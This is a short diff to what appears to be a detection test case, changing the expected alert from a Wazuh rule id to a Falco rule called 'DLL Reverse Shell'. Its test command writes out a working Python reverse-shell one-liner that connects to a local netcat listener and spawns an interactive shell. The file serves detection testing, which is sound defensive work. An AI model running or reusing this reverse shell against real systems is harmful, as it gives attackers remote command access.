@@ -5,5 +5,5 @@ command: |
   (timeout 5 nc -l -p 9998 >/dev/null 2>&1 &) ; sleep 1 ;
   timeout 3 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",9998));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])' || true
 expect:
-  engine: wazuh
-  rule_id: "100211"
+  engine: falco
+  rule: DLL Reverse Shell
